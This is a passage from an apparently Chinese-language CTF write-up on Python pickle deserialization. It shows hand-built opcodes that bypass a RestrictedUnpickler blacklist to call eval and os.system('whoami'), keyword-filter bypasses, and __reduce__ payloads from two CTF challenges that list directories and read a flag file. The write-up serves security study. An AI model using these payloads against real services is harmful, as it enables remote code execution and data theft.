    tRS'eval'
    tR.'''
    print(pickle.loads(opcode4))
    #
最终 我们构造命令执行
    import pickle
    import io
     import builtins
    class RestrictedUnpickler(pickle.Unpickler):
        blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}
        def find_class(self, module, name):
            # Only allow safe classes from builtins.
            if module == "builtins" and name not in self.blacklist:
                return getattr(builtins, name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                         (module, name))
    def restricted_loads(s):
        """Helper function analogous to pickle.loads()."""
        return RestrictedUnpickler(io.BytesIO(s)).load()
    opcode=b'''cbuiltins
    getattr
    (cbuiltins
    getattr
    (cbuiltins
    dict
    S'get'
    tR(cbuiltins
    globals
    )RS'__builtins__'
    tRS'eval'
    tR(S'__import__("os").system("whoami")'
    tR.
    '''
    restricted_loads(opcode)
    #可以成功执行whoami
以上的payload仅是一种方法 当我们想要绕过`find_class`​ 我们 可以先构造处沙箱逃逸的payload 然后
再根据payload构造opcode
当然 我们也可以用上面的pker来辅助我们生成opcode
##### 思路二
在思路一种 我们通过了getattr(builtins,'eval') 来获取到了内置函数 eval getattr的第一个参数 builtins模块
是通过获取globals种的全局变量来获得的 也就是说 globals() 函数中有python中提前设置好的全局变量 包括我们import的各种模块 那么
我们是否 可以通过globals函数 来获取到pickle模块捏 在引入之后 可以看到在全局变量中 存在pickle模块
可以看到，`globals()`​函数中的全局变量，确实包含我们导入的官方或自定义的模块，那么我们就可以尝试导入使用`pickle.loads()`​来绕过`find_class()`​了。
不过值得注意的是，由于`pickle.loads()`​的参数需要为`byte`​类型。而在`Protocol
0`​中，对于byte类型并没有很好的支持，需要额外导入encode()函数，可能会导致无法绕过`find_class`​限制。
在第三版本之后 才引入了B和C字节码来操作byte类型
‍
### 关键词绕过
#### V
就是使用unicode编码
    c__main__
    secret
    (V\u006bey  #key
    S'asd'
    db.
#### 十六进制
    c__main__
    secret
    (S'\x6bey'  #key
    S'asd'
    db.
#### 内置模块获取关键字
使用sys.modules[xxx]可以获取其全部属性 我们可以使用reversed将列表反序 然后使用next()指向关键词 从而输出
    print(next(reversed(dir(sys.modules['secret']))))
我们将上面的代码使用opcode表示一下
    (((c__main__
    secret
    i__builtins__
    dir
    i__builtins__
    reversed
    i__builtins__
    next
    .
### 题目
#### code-breaking2018 picklecode
上面在builtins讲的例子就是来源于这里 重新打一下
    import pickle
    import io
    import builtins
    __all__ = ('PickleSerializer', )
    class RestrictedUnpickler(pickle.Unpickler):
        blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}
        def find_class(self, module, name):
            # Only allow safe classes from builtins.
            if module == "builtins" and name not in self.blacklist:
                return getattr(builtins, name)
            # Forbid everything else.
            raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                         (module, name))
    class PickleSerializer():
        def dumps(self, obj):
            return pickle.dumps(obj)
        def loads(self, data):
            try:
                if isinstance(data, str):
                    raise TypeError("Can't load pickle from unicode string")
                file = io.BytesIO(data)
                return RestrictedUnpickler(file,
                                  encoding='ASCII', errors='strict').load()
            except Exception as e:
                return {}
只能从builtins中取且不能有上面的blacklist中的函数
那么 我们需要从其自带的builtins中 获取出我们的 命令执行函数
众所周知builtins中的getattr函数 可以获取属性
那么 我们尝试使用这个去获取一下eval呢
可以获取到构建好的eval 然后 我们需要获取到这个builtins的一级模块 我们直接使用pickle是获取不到的 我们看一下他的globals
其中是有builtins的 我们需要将其取出来
构造一个get
获取到get方法
然后这个绕过就串起来了
通过get获取builtins模块 获取builtins模块中的eval 从而进行命令执行
​`builtins.getattr(builtins.getattr(builtins.dict,"get")(builtins.globals(),"builtins"),'eval')("__import__('os').system('whoami')")`​
我们将其转换成opcode 如下
    cbuiltins
    getattr
    p0
    (cbuiltins
    dict
    S'get'
    tRp1
    cbuiltins
    globals
    )Rp2
    00g1
    (g2
    S'builtins'
    tRp3
    0g0
    (g3
    S'eval'
    tR(S'__import__("os").system("whoami")'
    tR.
成功绕过
同时也能执行命令
#### [CISCN 2019华北Day1]Web2
进入环境 需要寻找购买lv6
    import requests
    url = "http://ip/shop?page="
    for i in range (1,200):
        r = requests.get(url+str(i))
        if r.text.find('lv6.png') != -1:
            print(i)
            break
找到在181页
进入购买
购买需要admin权限 我们在cookie中发现jwt 解密发现user为asd
爆破密钥为1Kun 将user加密为admin
购买时将折扣值调为很小的值
发现源码
在admin中存在反序列化漏洞 会将结果渲染出来
    import pickle
    import commands
    import urllib
    class poc(object):
        def __reduce__(self):
            return (commands.getoutput,('ls /',))
    a=poc()
    print(urllib.quote(pickle.dumps(a)))
    import pickle
    import urllib
    class poc(object):
        def __reduce__(self):
            return (eval, ("open('/flag.txt','r').read()",))
    a=poc()
    print(urllib.quote(pickle.dumps(a)))
### 参考文章